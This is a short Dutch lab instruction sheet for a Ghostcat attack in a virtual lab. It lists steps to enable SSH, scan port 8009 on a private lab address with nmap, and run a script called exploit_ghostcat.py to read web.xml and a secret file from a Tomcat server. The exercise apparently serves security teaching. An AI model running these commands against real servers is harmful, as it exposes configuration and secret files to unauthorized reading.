# Starten van de aanval

## 1) Stappen om de aanval succesvol uit te voeren

- 4.1) Start de kali vm (indien deze nog niet aan staat):
- 4.2) zorg dat het setup_tomcat.sh bestand op de ubuntu vm staat (bv Downloads -> cd Downloads)
- 4.3) open terminal
- 4.4) sudo systemctl start ssh
- 4.5) sudo systemctl enable ssh
- 4.6) cd Downloads
- 4.7) chmod +x exploit_ghostcat.py
- 4.8) nmap 10.10.10.4 -p 8009
- 4.9) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/web.xml read
- 4.10) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/secret.txt read
